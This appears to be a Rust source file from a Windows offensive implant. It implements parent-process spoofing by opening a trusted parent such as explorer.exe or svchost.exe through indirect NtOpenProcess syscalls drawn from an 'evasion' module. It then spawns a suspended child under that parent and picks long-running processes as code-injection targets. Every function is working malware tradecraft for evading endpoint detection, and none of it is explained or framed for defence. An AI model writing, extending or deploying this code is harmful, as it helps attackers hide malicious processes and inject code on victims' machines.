#[cfg(target_os = "windows")]
use windows_sys::Win32::{
    System::Threading::{
        CreateProcessA, InitializeProcThreadAttributeList,
        UpdateProcThreadAttribute, DeleteProcThreadAttributeList,
        PROC_THREAD_ATTRIBUTE_PARENT_PROCESS,
        STARTUPINFOEXA, PROCESS_INFORMATION,
        EXTENDED_STARTUPINFO_PRESENT, CREATE_SUSPENDED,
        PROCESS_CREATE_PROCESS, PROCESS_QUERY_INFORMATION,
        STARTUPINFOA, LPPROC_THREAD_ATTRIBUTE_LIST,
    },
    Foundation::CloseHandle,
};

#[cfg(target_os = "windows")]
#[repr(C)]
struct ObjectAttributes {
    length: u32,
    root_directory: usize,
    object_name: usize,
    attributes: u32,
    security_descriptor: usize,
    security_quality_of_service: usize,
}

#[cfg(target_os = "windows")]
#[repr(C)]
struct ClientId {
    unique_process: usize,
    unique_thread: usize,
}

#[cfg(target_os = "windows")]
pub unsafe fn spawn_with_ppid(target_exe: &[u8], parent_name: &[u8]) -> Option<(isize, isize)> {
    let parent_pid = find_pid_by_name(parent_name)?;
    let mut oa: ObjectAttributes = unsafe { core::mem::zeroed() };
    oa.length = core::mem::size_of::<ObjectAttributes>() as u32;
    let mut cid: ClientId = unsafe { core::mem::zeroed() };
    cid.unique_process = parent_pid as usize;
    let mut h_parent: isize = 0;
    let (ssn_open, tramp_open) = crate::evasion::syscalls::get_ssn(b"NtOpenProcess")?;
    let status = crate::evasion::syscalls::indirect_syscall(
        ssn_open, tramp_open,
        &mut h_parent as *mut isize as usize,
        (PROCESS_CREATE_PROCESS | PROCESS_QUERY_INFORMATION) as usize,
        &oa as *const ObjectAttributes as usize,
        &cid as *const ClientId as usize,
        0, 0,
    );
    if status < 0 || h_parent == 0 { return None; }

    let mut attr_size: usize = 0;
    InitializeProcThreadAttributeList(core::ptr::null_mut(), 1, 0, &mut attr_size);
    let mut attr_buf = vec![0u8; attr_size];
    InitializeProcThreadAttributeList(attr_buf.as_mut_ptr() as LPPROC_THREAD_ATTRIBUTE_LIST, 1, 0, &mut attr_size);

    UpdateProcThreadAttribute(
        attr_buf.as_mut_ptr() as LPPROC_THREAD_ATTRIBUTE_LIST,
        0,
        PROC_THREAD_ATTRIBUTE_PARENT_PROCESS as usize,
        &h_parent as *const _ as *const core::ffi::c_void,
        core::mem::size_of::<isize>(),
        core::ptr::null_mut(),
        core::ptr::null(),
    );

    let mut si: STARTUPINFOEXA = core::mem::zeroed();
    si.StartupInfo.cb = core::mem::size_of::<STARTUPINFOEXA>() as u32;
    si.lpAttributeList = attr_buf.as_mut_ptr() as LPPROC_THREAD_ATTRIBUTE_LIST;
    let mut pi: PROCESS_INFORMATION = core::mem::zeroed();

    let ok = CreateProcessA(
        core::ptr::null(),
        target_exe.as_ptr() as *mut u8,
        core::ptr::null(), core::ptr::null(),
        0,
        EXTENDED_STARTUPINFO_PRESENT | CREATE_SUSPENDED,
        core::ptr::null(), core::ptr::null(),
        &si.StartupInfo as *const STARTUPINFOA,
        &mut pi,
    );

    DeleteProcThreadAttributeList(attr_buf.as_mut_ptr() as LPPROC_THREAD_ATTRIBUTE_LIST);
    CloseHandle(h_parent);

    if ok == 0 { return None; }
    Some((pi.hProcess, pi.hThread))
}

#[cfg(target_os = "windows")]
#[cfg(target_os = "windows")]
pub unsafe fn spawn_with_safe_ppid(target_exe: &[u8]) -> Option<(isize, isize)> {
    let candidates: &[&[u8]] = &[
        b"explorer.exe\0",
        b"RuntimeBroker.exe\0",
        b"sihost.exe\0",
        b"svchost.exe\0",
        b"SearchIndexer.exe\0",
    ];
    for &name in candidates {
        if let Some(result) = spawn_with_ppid(target_exe, name) {
            return Some(result);
        }
    }
    use windows_sys::Win32::System::Threading::{
        CreateProcessA, STARTUPINFOA, PROCESS_INFORMATION, CREATE_SUSPENDED,
    };
    use windows_sys::Win32::Foundation::CloseHandle;
    let mut si: STARTUPINFOA = core::mem::zeroed();
    si.cb = core::mem::size_of::<STARTUPINFOA>() as u32;
    let mut pi: PROCESS_INFORMATION = core::mem::zeroed();
    let ok = CreateProcessA(
        core::ptr::null(), target_exe.as_ptr() as *mut u8,
        core::ptr::null(), core::ptr::null(),
        0, CREATE_SUSPENDED, core::ptr::null(), core::ptr::null(),
        &si, &mut pi,
    );
    if ok == 0 { return None; }
    Some((pi.hProcess, pi.hThread))
}

#[cfg(target_os = "windows")]
/// Find a suitable injection target from a priority list of common user-space processes.
/// Prefers long-running, non-critical processes that won't be killed during an operation.
pub unsafe fn find_injection_target() -> Option<u32> {
    const TARGETS: &[&[u8]] = &[
        b"explorer.exe\0",
        b"OneDrive.exe\0",
        b"RuntimeBroker.exe\0",
        b"sihost.exe\0",
        b"SearchApp.exe\0",
    ];
    for &name in TARGETS {
        if let Some(pid) = find_pid_by_name(name) {
            return Some(pid);
        }
    }
    None
}

#[cfg(target_os = "windows")]
unsafe fn find_pid_by_name(name: &[u8]) -> Option<u32> {
    use windows_sys::Win32::System::Diagnostics::ToolHelp::{
        CreateToolhelp32Snapshot, Process32First, Process32Next,
        TH32CS_SNAPPROCESS, PROCESSENTRY32,
    };
    let snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if snap == 0 { return None; }
    let mut entry: PROCESSENTRY32 = core::mem::zeroed();
    entry.dwSize = core::mem::size_of::<PROCESSENTRY32>() as u32;
    if Process32First(snap, &mut entry) == 0 { CloseHandle(snap); return None; }
    loop {
        let max_len = name.len().min(entry.szExeFile.len());
        let exe_slice = &entry.szExeFile[..max_len];
        if exe_slice.iter().zip(name.iter()).all(|(&a, &b)| a == b as u8) {
            CloseHandle(snap);
            return Some(entry.th32ProcessID);
        }
        if Process32Next(snap, &mut entry) == 0 { break; }
    }
    CloseHandle(snap);
    None
}
